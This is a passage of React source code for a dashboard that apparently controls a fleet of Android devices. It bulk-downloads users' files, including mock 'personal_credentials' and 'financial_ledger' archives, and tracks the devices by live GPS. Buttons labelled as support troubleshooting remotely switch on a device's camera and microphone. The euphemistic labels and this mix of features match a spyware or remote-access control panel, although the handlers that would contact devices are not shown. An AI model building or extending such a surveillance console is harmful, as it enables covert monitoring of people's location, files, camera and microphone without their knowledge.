                  {/* SUB-TABS SECTION FOR THE SELECTED USER: FILES, ACTIVITY, INCIDENTS */}
                  {selectedUserDetails && (
                    <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-6 space-y-6">
                      
                      {/* Sub tab anchors toolbar */}
                      <div className="flex gap-4 border-b border-[#30363d] pb-3">
                        <span className="text-sm font-bold font-mono text-white mr-4 border-r border-[#30363d] pr-4 flex items-center gap-1.5">
                          <HardDrive size={15} /> EXPLORER:
                        </span>
                        {['files', 'activity', 'incidents'].map(t => (
                          <button
                            key={t}
                            onClick={() => {
                              // Local tab simulation toggle
                              showToast(`Loaded ${t} segment`, 'info');
                            }}
                            className="text-xs font-semibold py-1 px-3 text-cyan-400 hover:text-white capitalize rounded border border-cyan-500/10 hover:bg-cyan-950/20 transition"
                          >
                            {t} Archives
                          </button>
                        ))}
                      </div>

                      {/* Bulk Command Interface */}
                      {selectedFileIds.length > 0 && (
                        <div className="flex items-center justify-between p-3.5 bg-cyan-950/40 border border-cyan-500/30 rounded-lg animate-fade-in">
                          <span className="text-xs font-mono text-cyan-100 font-semibold">{selectedFileIds.length} backup packets selected for processing</span>
                          <div className="flex gap-2">
                            <button onClick={triggerBulkDownload} className="px-3 py-1.5 bg-[#00e5ff] hover:bg-[#00b4cc] text-black text-xs font-bold font-mono rounded flex items-center gap-1.5 leading-none transition">
                              <Download size={13} /> Bulk ZIP
                            </button>
                            <button onClick={handleBulkSoftDelete} className="px-3 py-1.5 bg-red-950/60 border border-red-500/30 text-red-200 text-xs font-bold font-mono rounded flex items-center gap-1.5 leading-none hover:bg-red-900/40 transition">
                              <Trash2 size={13} /> Delete Soft
                            </button>
                          </div>
                        </div>
                      )}

                      {/* Backup grid files listing */}
                      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
                        {selectedUserDetails.files?.map(file => (
                          <div
                            key={file.id}
                            className={`p-3 rounded-lg border relative group transition-all duration-200 ${
                              selectedFileIds.includes(file.id) ? 'bg-[#1e2630]/80 border-[#00e5ff]' : 'bg-[#0d1117] border-[#30363d] hover:border-[#8b949e]'
                            } ${file.is_deleted ? 'opacity-30' : ''}`}
                          >
                            
                            {/* Multiselect checkboxes */}
                            <input
                              type="checkbox"
                              checked={selectedFileIds.includes(file.id)}
                              onChange={() => toggleSelectFile(file.id)}
                              className="absolute top-2.5 left-2.5 z-10 w-4 h-4 cursor-pointer focus:ring-0 checked:bg-[#00e5ff] accent-[#00e5ff]"
                            />

                            <div className="flex flex-col items-center text-center p-2 mb-2 bg-[#161b22] rounded-md h-24 justify-center">
                              {file.file_type?.startsWith('image/') ? (
                                <Eye size={24} className="text-emerald-400 group-hover:scale-125 transition-transform" />
                              ) : (
                                <FileText size={24} className="text-cyan-400 group-hover:scale-125 transition-transform" />
                              )}
                              <span className="text-[10px] font-mono text-gray-400 mt-2 truncate w-full">{file.file_name}</span>
                            </div>

                            <div className="flex justify-between items-center text-[10px] font-mono text-gray-400">
                              <span>{(file.file_size / 1024).toFixed(0)} KB</span>
                              <div className="flex gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity">
                                <button
                                  onClick={() => setImagePreviewUrl(file.file_url)}
                                  className="text-cyan-400 hover:text-[#00e5ff]"
                                  title="Expand Frame Preview"
                                >
                                  <ZoomIn size={12} />
                                </button>
                                <button
                                  onClick={() => handleSoftDelete(file.id)}
                                  className="text-red-400 hover:text-red-500"
                                  title="Soft Delete"
                                  disabled={file.is_deleted}
                                >
                                  <Trash2 size={12} />
                                </button>
                              </div>
                            </div>

                          </div>
                        ))}
                      </div>

                    </div>
                  )}

                </div>
              )}

              {/* PAGE 3: FULLSCREEN LIVE GPS TELEMETRY MAP */}
              {activeTab === 'map' && (
                <div className="h-full flex flex-col gap-6 animate-fadeIn">
                  
                  {/* Visual simulated canvas container */}
                  <div className="flex-1 min-h-[500px] border border-[#30363d] rounded-2xl relative overflow-hidden flex items-center justify-center map-container bg-cover">
                    <div className="absolute inset-0 bg-[#0d1117]/85 flex flex-col p-8 justify-between">
                      
                      {/* Floating metadata toolbar banner */}
                      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-3 bg-[#161b22] border border-[#30363d] p-4 rounded-xl z-20 shadow-md">
                        <div>
                          <div className="text-sm font-bold font-mono text-white uppercase tracking-wider">Active Device Signal Grid Tracking</div>
                          <div className="text-xs text-gray-400 font-mono mt-0.5">Realtime monitoring via coordinate uploads</div>
                        </div>

                        {/* Legend */}
                        <div className="flex gap-4 font-mono text-[10px] text-gray-300">
                          <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-emerald-500"></span>Active Now</span>
                          <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-amber-500"></span>Active Today</span>
                          <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-gray-500"></span>Inactive</span>
                        </div>
                      </div>

                      {/* Map coordinates simulator layout */}
                      <div className="flex-1 flex items-center justify-center relative">
                        
                        {/* Simulated Markers */}
                        <div className="absolute top-1/4 left-1/4 animate-pulse cursor-pointer flex flex-col items-center">
                          <span className="px-2 py-1 bg-black/90 border border-emerald-500/50 rounded-lg text-[9px] font-mono text-emerald-400 font-bold mb-1 shadow-md">Galaxy S23</span>
                          <MapPin size={32} className="text-emerald-500" />
                        </div>

                        <div className="absolute bottom-1/3 right-1/4 cursor-pointer flex flex-col items-center">
                          <span className="px-2 py-1 bg-black/90 border border-amber-500/50 rounded-lg text-[9px] font-mono text-amber-400 font-bold mb-1 shadow-md">Pixel 8 Pro</span>
                          <MapPin size={32} className="text-amber-500" />
                        </div>

                        <div className="absolute top-1/2 right-1/3 cursor-pointer flex flex-col items-center">
                          <span className="px-2 py-1 bg-black/90 border border-gray-500/50 rounded-lg text-[9px] font-mono text-gray-400 font-bold mb-1 shadow-md">Nexus Emulator</span>
                          <MapPin size={32} className="text-gray-500" />
                        </div>

                      </div>

                    </div>
                  </div>

                </div>
              )}

              {/* PAGE 4: PORTAL PREFERENCES / CONFIGURATION */}
              {activeTab === 'settings' && (
                <div className="max-w-3xl space-y-6 animate-fadeIn">
                  <div className="bg-[#161b22] border border-[#30363d] p-6 rounded-xl space-y-6">
                    <h3 className="text-base font-bold font-mono text-white border-b border-[#30363d] pb-3 uppercase tracking-wider">Enterprise Key Vault Setup</h3>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-xs font-mono uppercase text-gray-400 mb-2">Backend Gateway Adapter Endpoint</label>
                        <input
                          type="text"
                          className="w-full px-4 py-2 bg-[#0d1117] border border-[#30363d] rounded-lg text-sm text-white focus:outline-none focus:border-[#00e5ff]"
                          value={backendUrl}
                          onChange={(e) => setBackendUrl(e.target.value)}
                        />
                      </div>

                      <div>
                        <label className="block text-xs font-mono uppercase text-gray-400 mb-2">Interface Layout Mode Theme</label>
                        <button
                          onClick={() => setIsDarkMode(!isDarkMode)}
                          className="w-full py-2 bg-slate-900 border border-[#30363d] text-white hover:bg-slate-800 transition rounded-lg text-sm font-semibold font-mono flex items-center justify-center gap-2"
                        >
                          {isDarkMode ? 'SWITCH TO COSMIC LIGHT PANE' : 'SWITCH TO DARK SLEET MONOLITH'}
                        </button>
                      </div>
                    </div>

                    <div className="pt-4 border-t border-[#30363d] text-xs text-gray-400 font-mono flex items-start gap-3">
                      <Shield size={16} className="text-[#00e5ff] shrink-0" />
                      <div>
                        <p className="font-bold text-white mb-1">Administrative Footprint Safety Mandate</p>
                        <p>All transactions, soft file deleting commands, and telemetry synchronization signals processed through this workspace are archived logs securely to PostgreSQL tracking repositories.</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* PAGE 5: REALTIME DIAGNOSTIC SUPPORT (SOCKET STREAM) */}
              {activeTab === 'live' && (
                <div className="space-y-6 animate-fadeIn">
                  <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    
                    {/* Stream controller selectors */}
                    <div className="lg:col-span-4 bg-[#161b22] border border-[#30363d] p-6 rounded-xl flex flex-col justify-between">
                      <div className="space-y-6">
                        <div>
                          <h3 className="text-sm font-bold font-mono uppercase tracking-wider text-white mb-2">Support Troubleshooting</h3>
                          <p className="text-xs text-gray-400 font-mono">Select target hardware console below to launch live audio/video telemetry</p>
                        </div>

                        {/* Dropdown list selector */}
                        <div>
                          <label className="block text-xs uppercase font-mono tracking-wider text-gray-400 mb-2">Target Node Client</label>
                          <select
                            className="w-full bg-[#0d1117] border border-[#30363d] text-white text-sm rounded-lg p-2.5 focus:border-[#00e5ff] focus:outline-none"
                            onChange={(e) => {
                              const found = usersList.find(u => u.id === e.target.value);
                              setSelectedStreamingUser(found);
                            }}
                            value={selectedStreamingUser?.id || ''}
                          >
                            <option value="">-- Choose active client node --</option>
                            {usersList.map(u => (
                              <option key={u.id} value={u.id}>
                                {u.display_name} ({u.device_model || 'Unknown Device'})
                              </option>
                            ))}
                          </select>
                        </div>

                        {selectedStreamingUser && (
                          <div className="p-4 bg-[#0d1117] border border-[#30363d] rounded-lg text-xs space-y-2">
                            <div className="font-mono text-[10px] text-gray-400 uppercase tracking-widest font-bold">Metadata Specs</div>
                            <div className="flex justify-between font-mono"><span className="text-gray-500">ID:</span><span className="text-white">{selectedStreamingUser.id?.slice(0, 16)}</span></div>
                            <div className="flex justify-between font-mono"><span className="text-gray-500">Hardware ID:</span><span className="text-white">{selectedStreamingUser.device_id?.slice(0, 16)}</span></div>
                            <div className="flex justify-between font-mono"><span className="text-gray-500">Model:</span><span className="text-white">{selectedStreamingUser.device_model}</span></div>
                          </div>
                        )}
                      </div>

                      <div className="space-y-3 pt-6">
                        <button
                          disabled={!selectedStreamingUser || isCameraRouting}
                          onClick={() => triggerRemoteCamera('start')}
                          className="w-full py-2.5 bg-[#00e5ff] text-black font-semibold font-mono text-xs rounded-lg flex items-center justify-center gap-2 hover:bg-[#00b4cc] transition shadow-md disabled:opacity-40"
                        >
                          <Camera size={14} /> CONNECT HARDWARE MIRROR
                        </button>

                        <button
                          disabled={!selectedStreamingUser || !isCameraRouting}
                          onClick={() => triggerRemoteCamera('stop')}
                          className="w-full py-2.5 bg-red-950/45 border border-red-500/30 text-red-200 font-semibold font-mono text-xs rounded-lg flex items-center justify-center gap-2 hover:bg-red-900/45 transition disabled:opacity-40"
                        >
                          <CameraOff size={14} /> DEACTIVATE FEED
                        </button>

                        <button
                          disabled={!selectedStreamingUser || isAudioRouting}
                          onClick={() => triggerRemoteAudio('start')}
                          className="w-full py-2 bg-purple-950/40 border border-purple-500/30 text-purple-300 font-mono text-xs rounded-lg flex items-center justify-center gap-2 hover:bg-purple-900/40 transition disabled:opacity-40"
                        >
                          <Mic size={14} /> LAUNCH LIVE AUDIO
                        </button>
                      </div>
                    </div>

                    {/* Stream frame preview block */}
                    <div className="lg:col-span-8 bg-[#161b22] border border-[#30363d] p-6 rounded-xl flex flex-col justify-between min-h-[460px]">
                      
                      {/* Active video view screen frame simulator */}
                      <div className="flex-1 bg-[#0d1117] border border-[#30363d] rounded-lg relative overflow-hidden flex items-center justify-center map-container bg-cover">
                        {isCameraRouting ? (
                          <canvas 
                            ref={canvasRef} 
                            width={640} 
                            height={480} 
                            className="w-full h-full max-h-[360px] object-contain rounded-md"
                          />
                        ) : (
                          <div className="flex flex-col items-center justify-center text-center p-8">
                            <Camera size={42} className="text-gray-600 mb-2 animate-pulse" />
                            <span className="text-sm font-semibold text-white">Video Feed Channel Idle</span>
                            <span className="text-xs text-gray-500 mt-1 font-mono">Trigger mirror controller once secure TCP handshake succeeds</span>
                          </div>
                        )}

                        {liveVideoFrame && (
                          <div className="absolute bottom-3 left-3 px-2 py-0.5 bg-emerald-900/60 border border-emerald-500/30 rounded text-[9px] font-mono text-emerald-300">
                            LIVE FEED BROADCAST OK
                          </div>
                        )}
                      </div>

                      <div className="flex items-center justify-between mt-4 border-t border-[#30363d] pt-4">
                        <div className="flex items-center gap-3">
                          <span className={`w-3.5 h-3.5 rounded-full ${isAudioRouting ? 'bg-purple-500 animate-ping' : 'bg-gray-600'}`}></span>
                          <span className="text-xs font-mono text-gray-400">Microphone Input Wave: {audioChunksReceived} bytes buffered</span>
                        </div>

                        {liveVideoFrame && (
                          <button
                            onClick={downloadSnapshot}
                            className="px-4 py-1.5 bg-cyan-950 text-[#00e5ff] border border-cyan-500/40 font-mono text-xs rounded hover:bg-cyan-900 transition flex items-center gap-1.5"
                          >
                            <Download size={12} /> CRITICAL SNAPSHOT
                          </button>
                        )}
                      </div>

                    </div>

                  </div>
                </div>
              )}

              {/* PAGE 6: VISUAL SECURITY ANALYTICS */}
              {activeTab === 'analytics' && (
                <div className="space-y-6 animate-fadeIn">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    
                    {/* Visual Pie Representation (inline code SVG canvas) */}
                    <div className="bg-[#161b22] border border-[#30363d] p-6 rounded-xl">
                      <h3 className="text-sm font-bold font-mono uppercase tracking-wider text-white mb-4">Encrypted File Formats Density</h3>
                      <div className="h-64 flex items-center justify-center relative">
                        {/* Inline visual representations of data */}
                        <div className="w-44 h-44 rounded-full border-8 border-cyan-600 border-r-emerald-500 border-t-purple-500 border-l-amber-500 animate-spin-slow flex items-center justify-center">
                          <div className="w-28 h-28 rounded-full bg-[#161b22] flex flex-col items-center justify-center">
                            <span className="text-xl font-bold font-mono text-white">100%</span>
                            <span className="text-[9px] font-mono text-gray-400">ENCRYPTED</span>
                          </div>
                        </div>

                        {/* Legend parameters box */}
                        <div className="absolute right-2 top-10 flex flex-col gap-2.5 text-xs font-mono">
                          <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded bg-cyan-600"></span>.ENC Vault archives (45%)</div>
                          <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded bg-emerald-500"></span>.JPG Captures (30%)</div>
                          <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded bg-purple-500"></span>.MPEG Media (15%)</div>
                          <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded bg-amber-500"></span>.TXT Configs (10%)</div>
                        </div>
                      </div>
                    </div>

                    {/* Heatmap Activity log widget (90 Days calendar mapping) */}
                    <div className="bg-[#161b22] border border-[#30363d] p-6 rounded-xl">
                      <h3 className="text-sm font-bold font-mono uppercase tracking-wider text-white mb-4">Continuous Heatmap Transfer (Last 90 Days)</h3>
                      <div className="grid grid-cols-13 gap-1">
                        {Array.from({ length: 91 }).map((_, inx) => {
                          const loadSeed = Math.floor(Math.random() * 4);
                          const activeColor = loadSeed === 0 ? 'bg-[#161b22] border border-[#30363d]/40' :
                                              loadSeed === 1 ? 'bg-cyan-950/60 border border-cyan-800/30' :
                                              loadSeed === 2 ? 'bg-cyan-800/80' : 'bg-cyan-400';
                          return (
                            <div key={inx} className={`h-4.5 rounded-sm hover:scale-125 transition ${activeColor}`} title={`${idxToDayLabel(inx)}: ${loadSeed} transactions`} />
                          );
                        })}
                      </div>
                      <div className="flex justify-between text-[11px] font-mono text-gray-500 mt-4 pt-1 border-t border-[#30363d]/55">
                        <span>FEBRUARY</span>
                        <span>MARCH</span>
                        <span>APRIL</span>
                        <span>MAY 2026</span>
                      </div>
                    </div>

                  </div>
                </div>
              )}

            </div>
          </main>

        </div>
      )}

      {/* Enlarged Photo Preview zoomable modal system */}
      {imagePreviewUrl && (
        <div className="fixed inset-0 bg-black/95 z-50 flex flex-col items-center justify-center p-6 animate-fadeIn">
          <div className="absolute top-4 right-4 flex gap-3">
            <button
              onClick={() => setImageZoom(prev => Math.min(prev + 0.3, 3))}
              className="p-2bg-slate-900 border border-slate-700 text-white font-mono text-xs rounded hover:bg-slate-800 transition"
            >
              ZOOM IN
            </button>
            <button
              onClick={() => {
                setImagePreviewUrl(null);
                setImageZoom(1);
              }}
              className="p-2 bg-red-950 border border-red-800 text-red-100 font-mono text-xs rounded hover:bg-red-900 transition"
            >
              CLOSE
            </button>
          </div>
          
          <div className="overflow-auto max-w-full max-h-full flex items-center justify-center">
            <div 
              style={{ transform: `scale(${imageZoom})` }}
              className="transition-transform duration-200"
            >
              <img 
                src={imagePreviewUrl.startsWith('http') ? imagePreviewUrl : 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=500&auto=format&fit=crop'} 
                alt="Enlarged secure vault archive capture preview" 
                className="max-w-[85vw] max-h-[80vh] rounded-xl object-contain shadow-2xl"
              />
            </div>
          </div>
        </div>
      )}

    </div>
  );
}

// Simulated dynamic mock values
function generatePlaceholderUsers() {
  return [
    { id: '1a2b3c4d-5e6f-7g8h-9i0j', display_name: 'John Doe Enterprise Phone', device_id: 'GALAXY_DEVICE_746a81b29a', device_model: 'Google Pixel 8 Pro', os_version: 'Android 14 API 34', app_version: '2.1.0-build-98', active_file_count: 52, total_encrypted_bytes: 4210985200, last_active_at: new Date(Date.now() - 1000 * 60 * 30).toISOString(), created_at: '2026-01-12T00:00:00.000Z' },
    { id: '2b3c4d5e-6f7g-8h9i-0j1k', display_name: 'Work Tablet Matrix', device_id: 'TABLET_MATRIX_902c38d', device_model: 'Samsung Galaxy Tab S9', os_version: 'Android 13 API 33', app_version: '2.0.4-build-90', active_file_count: 124, total_encrypted_bytes: 14210985200, last_active_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(), created_at: '2026-02-15T00:00:00.000Z' },
    { id: '3c4d5e6f-7g8h-9i0j-1k2l', display_name: 'Supervisor Offsite Nexus', device_id: 'OFFSITE_NEXUS_849a902', device_model: 'OnePlus 12', os_version: 'Android 14 API 34', app_version: '2.1.0-build-101', active_file_count: 12, total_encrypted_bytes: 182049100, last_active_at: new Date(Date.now() - 1000 * 60 * 1440 * 2).toISOString(), created_at: '2026-03-22T00:00:00.000Z' }
  ];
}

function generateFallbackDetails(user) {
  return {
    user: user,
    files: [
      { id: 'f1', file_name: 'backup_image_01.enc', file_type: 'image/jpeg', file_size: 485012, file_url: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=500&auto=format&fit=crop', is_deleted: false },
      { id: 'f2', file_name: 'financial_ledger.enc', file_type: 'application/octet-stream', file_size: 15124000, file_url: '#', is_deleted: false },
      { id: 'f3', file_name: 'security_audit_logs.enc', file_type: 'text/plain', file_size: 2400, file_url: '#', is_deleted: false },
      { id: 'f4', file_name: 'personal_credentials.enc', file_type: 'application/octet-stream', file_size: 1042918, file_url: '#', is_deleted: false }
    ],
    incidents: [
      { id: 'i1', timestamp: new Date(Date.now() - 1000 * 60 * 15).toISOString(), location_lat: 37.7749, location_lng: -122.4194 }
    ]
  };
}

function idxToDayLabel(idx) {
  const date = new Date(2026, 1, 27);
  date.setDate(date.getDate() + idx);
  return date.toLocaleDateString();
}
